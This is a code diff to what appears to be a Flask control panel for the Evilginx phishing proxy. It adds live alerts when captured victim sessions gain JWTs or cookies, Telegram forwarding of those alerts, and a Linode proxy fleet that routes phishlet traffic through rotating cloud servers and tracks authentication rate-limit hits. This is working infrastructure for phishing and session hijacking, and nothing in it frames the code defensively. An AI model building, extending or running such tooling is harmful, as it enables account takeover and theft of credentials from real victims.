@@ -18,6 +18,7 @@ import subprocess
 import threading
 import secrets
 import re
+from concurrent.futures import ThreadPoolExecutor
 from datetime import datetime
 from functools import wraps
 
@@ -41,6 +42,7 @@ PANEL_HOST = os.environ.get("PANEL_HOST", "0.0.0.0")
 PANEL_PORT = int(os.environ.get("PANEL_PORT", "8443"))
 PANEL_USER = os.environ.get("PANEL_USER", "root")
 PANEL_PASS = os.environ.get("PANEL_PASS", "")
+PANEL_VERSION = "3.3.0"  # keep in sync with evilginx_setup.PANEL_BUILD + templates
 
 # ═══════════════════════════════════════════════════════════════════════════════
 #  FLASK SETUP
@@ -48,6 +50,10 @@ PANEL_PASS = os.environ.get("PANEL_PASS", "")
 
 app = Flask(__name__)
 app.secret_key = secrets.token_hex(32)
+
+@app.context_processor
+def _inject_panel():
+    return {"panel_version": PANEL_VERSION}
 app.config["PERMANENT_SESSION_LIFETIME"] = 86400
 
 socketio = SocketIO(app, cors_allowed_origins="*", async_mode="threading")
@@ -1093,6 +1099,56 @@ def _notif_monitor_loop():
         except Exception:
             pass
 
+
+def _session_live_loop():
+    """Push dashboard updates the moment a session gains JWT or cookies."""
+    prev = {}
+    seeded = False
+    last_mtime = 0
+    last_size = -1
+    while True:
+        try:
+            time.sleep(1)
+            if not os.path.isfile(EVILGINX_DATA):
+                continue
+            st = os.stat(EVILGINX_DATA)
+            if st.st_mtime == last_mtime and st.st_size == last_size:
+                continue
+            last_mtime = st.st_mtime
+            last_size = st.st_size
+            sessions = _parse_sessions()
+            now = {}
+            changed = []
+            for s in sessions:
+                sid = s.get("id")
+                jwt = bool(s.get("has_jwt"))
+                nc = int(s.get("n_cookies") or 0)
+                sig = (jwt, nc, int(s.get("update_time") or 0))
+                now[sid] = sig
+                if not seeded:
+                    continue
+                old = prev.get(sid)
+                if old == sig:
+                    continue
+                gained_jwt = jwt and (not old or not old[0])
+                gained_ck = nc > 0 and (not old or nc > (old[1] or 0))
+                if gained_jwt or gained_ck or (old is None and (jwt or nc > 0)):
+                    changed.append({
+                        "id": sid,
+                        "has_jwt": jwt,
+                        "n_cookies": nc,
+                        "phishlet": s.get("phishlet") or "",
+                    })
+            prev = now
+            seeded = True
+            if changed:
+                try:
+                    socketio.emit("session_live", {"sessions": changed[-8:]})
+                except Exception:
+                    pass
+        except Exception:
+            time.sleep(2)
+
 @app.route("/api/notifications", methods=["GET", "POST"])
 @auth
 def api_notifications():
@@ -1893,6 +1949,269 @@ def ws_journal_stop():
         pass
 
 # ═══════════════════════════════════════════════════════════════════════════════
+#  NOTIFICATION CENTRE  +  LINODE PROXY FLEET
+# ═══════════════════════════════════════════════════════════════════════════════
+
+NC_FILE = os.path.join(os.path.dirname(EVILGINX_CONFIG), "panel_notifications.json")
+PROXY_FILE = os.path.join(os.path.dirname(EVILGINX_CONFIG), "linode_proxy.json")
+_nc_lock = threading.Lock()
+
+def _nc_load():
+    if os.path.isfile(NC_FILE):
+        try:
+            return json.load(open(NC_FILE))
+        except Exception:
+            pass
+    return {"items": [], "seq": 1}
+
+def _nc_save(d):
+    with open(NC_FILE, "w") as f:
+        json.dump(d, f)
+
+def nc_push(title, message, ntype="info"):
+    with _nc_lock:
+        d = _nc_load()
+        item = {
+            "id": d.get("seq", 1),
+            "title": title,
+            "message": message,
+            "type": ntype,
+            "ts": int(time.time()),
+            "read": False,
+        }
+        d["seq"] = item["id"] + 1
+        d.setdefault("items", []).insert(0, item)
+        d["items"] = d["items"][:300]
+        _nc_save(d)
+    try:
+        socketio.emit("nc_new", item)
+    except Exception:
+        pass
+    try:
+        ns = _read_notif_settings()
+        if ns.get("enabled") and ns.get("bot_token") and ns.get("chat_id"):
+            _send_telegram(ns["bot_token"], ns["chat_id"], f"<b>{title}</b>\n{message}")
+    except Exception:
+        pass
+    return item
+
+import proxy_engine as pxe
+pxe.init(PROXY_FILE, PHISHLETS_DIR, EVILGINX_CONFIG, nc_push)
+pxe.start_sidecar()
+
+
+@app.route("/api/nc")
+@auth
+def api_nc_list():
+    d = _nc_load()
+    items = d.get("items") or []
+    unread = sum(1 for i in items if not i.get("read"))
+    return jsonify(items=items[:80], unread=unread)
+
+
+@app.route("/api/nc/read", methods=["POST"])
+@auth
+def api_nc_read():
+    data = request.get_json(force=True) or {}
+    with _nc_lock:
+        d = _nc_load()
+        if data.get("all"):
+            for i in d.get("items") or []:
+                i["read"] = True
+        else:
+            nid = data.get("id")
+            for i in d.get("items") or []:
+                if i.get("id") == nid:
+                    i["read"] = True
+        _nc_save(d)
+    return jsonify(ok=True)
+
+
+@app.route("/api/nc/clear", methods=["POST"])
+@auth
+def api_nc_clear():
+    with _nc_lock:
+        d = _nc_load()
+        d["items"] = [i for i in d.get("items") or [] if not i.get("read")]
+        _nc_save(d)
+    return jsonify(ok=True)
+
+
+@app.route("/api/proxy/key", methods=["GET", "POST"])
+@auth
+def api_proxy_key():
+    if request.method == "GET":
+        s = pxe.load()
+        return jsonify(configured=bool(s.get("api_key")), allow_ip=pxe.public_ipv4())
+    data = request.get_json(force=True) or {}
+    key = (data.get("api_key") or "").strip()
+    if not key:
+        return jsonify(ok=False, error="API key is incorrect")
+    ok, err = pxe.validate_key(key)
+    if not ok:
+        return jsonify(ok=False, error="API key is incorrect")
+    s = pxe.load()
+    s["api_key"] = key
+    pxe.save(s)
+    nc_push("Linode connected", "API key accepted. You can deploy Nanode proxies.", "success")
+    return jsonify(ok=True)
+
+
+@app.route("/api/proxy/regions")
+@auth
+def api_proxy_regions():
+    try:
+        return jsonify(pxe.list_regions())
+    except Exception as e:
+        return jsonify(error=str(e))
+
+
+@app.route("/api/proxy/state")
+@auth
+def api_proxy_state():
+    st = pxe.public_state()
+    proxies = list(st.get("proxies") or [])
+    light = (request.args.get("light") or "") in ("1", "true", "yes")
+
+    def _enrich(p):
+        panel_status = p.get("status")
+        ready = p.get("ready")
+        if p.get("id"):
+            m = pxe.instance_metrics(p["id"], with_stats=not light)
+            if light:
+                if m.get("error"):
+                    p["metrics_error"] = m["error"]
+                if m.get("linode_status"):
+                    p["linode_status"] = m["linode_status"]
+                if m.get("ipv4"):
+                    p["ipv4"] = m["ipv4"]
+            else:
+                if m.get("error"):
+                    p["metrics_error"] = m["error"]
+                for k, v in m.items():
+                    if k in ("error", "status"):
+                        continue
+                    p[k] = v
+        p["status"] = panel_status
+        p["ready"] = ready if ready is not None else (panel_status == "active")
+        return p
+
+    if len(proxies) > 1:
+        with ThreadPoolExecutor(max_workers=min(8, len(proxies))) as pool:
+            metrics = list(pool.map(_enrich, proxies))
+    else:
+        metrics = [_enrich(p) for p in proxies]
+    st["proxies"] = metrics
+    resp = jsonify(st)
+    resp.headers["Cache-Control"] = "no-store, no-cache, must-revalidate"
+    return resp
+
+
+@app.route("/api/proxy/deploy", methods=["POST"])
+@auth
+def api_proxy_deploy():
+    data = request.get_json(force=True) or {}
+    count = int(data.get("count") or 0)
+    regions = data.get("regions") or []
+    if count < 1:
+        return jsonify(error="server count required")
+    if not regions:
+        return jsonify(error="pick at least one region")
+    if len(regions) > count:
+        return jsonify(error="cannot pick more regions than servers")
+    s = pxe.load()
+    if s.get("deploy", {}).get("running"):
+        return jsonify(error="deploy already running")
+    pxe.deploy_async(count, regions, restart_egx=lambda: egm.restart())
+    return jsonify(ok=True)
+
+
+@app.route("/api/proxy/assign", methods=["POST"])
+@auth
+def api_proxy_assign():
+    data = request.get_json(force=True) or {}
+    ph = data.get("phishlet") or ""
+    ids = data.get("ids") or []
+    if not ph or not re.match(r"^[a-zA-Z0-9_\-]+$", ph):
+        return jsonify(error="invalid phishlet")
+    st = pxe.assign(ph, ids)
+    try:
+        egm.restart()
+    except Exception:
+        pass
+    nc_push("Proxy assignment", f"{ph} → {len(ids)} proxy(ies). Evilginx restarted to apply outbound tunnel.", "info")
+    return jsonify(ok=True, **st)
+
+
+@app.route("/api/proxy/detach", methods=["POST"])
+@auth
+def api_proxy_detach():
+    data = request.get_json(force=True) or {}
+    ph = data.get("phishlet") or ""
+    ids = data.get("ids") or []
+    if not ph or not re.match(r"^[a-zA-Z0-9_\-]+$", ph):
+        return jsonify(error="invalid phishlet")
+    if not ids:
+        return jsonify(error="select proxy to detach")
+    st = pxe.detach(ph, ids)
+    nc_push("Proxy detached", f"{ph}: removed {len(ids)} proxy(ies) from the pool.", "info")
+    return jsonify(ok=True, **st)
+
+
+@app.route("/api/proxy/repair", methods=["POST"])
+@auth
+def api_proxy_repair():
+    data = request.get_json(force=True) or {}
+    lid = data.get("id")
+    if not lid:
+        return jsonify(error="id required")
+    try:
+        pxe.repair_async(lid)
+        return jsonify(ok=True)
+    except Exception as e:
+        return jsonify(error=str(e))
+
+
+@app.route("/api/proxy/destroy", methods=["POST"])
+@auth
+def api_proxy_destroy():
+    data = request.get_json(force=True) or {}
+    lid = data.get("id")
+    if not lid:
+        return jsonify(error="id required")
+    try:
+        st = pxe.destroy_instance(lid)
+        return jsonify(ok=True, **st)
+    except Exception as e:
+        return jsonify(error=str(e))
+
+
+@app.route("/api/proxy/power", methods=["POST"])
+@auth
+def api_proxy_power():
+    data = request.get_json(force=True) or {}
+    lid = data.get("id")
+    action = (data.get("action") or "").strip().lower()
+    if not lid:
+        return jsonify(error="id required")
+    if action not in ("start", "stop", "restart"):
+        return jsonify(error="action must be start, stop or restart")
+    try:
+        st = pxe.power_instance(lid, action)
+        return jsonify(ok=True, **st)
+    except Exception as e:
+        return jsonify(error=str(e))
+
+
+@app.route("/api/internal/egx-429", methods=["POST"])
+def api_egx_429():
+    if request.remote_addr not in ("127.0.0.1", "::1"):
+        return jsonify(error="forbidden"), 403
+    data = request.get_json(force=True, silent=True) or {}
+    return jsonify(pxe.record_auth_429(data.get("phishlet") or "", data.get("host") or "", data.get("path") or ""))
+
+
+# ═══════════════════════════════════════════════════════════════════════════════
 #  MAIN
 # ═══════════════════════════════════════════════════════════════════════════════
 
@@ -1900,6 +2219,8 @@ def ws_journal_stop():
 import threading as _thr
 _notif_thread = _thr.Thread(target=_notif_monitor_loop, daemon=True)
 _notif_thread.start()
+_live_thread = _thr.Thread(target=_session_live_loop, daemon=True)
+_live_thread.start()
 
 if __name__ == "__main__":
     egm.start()
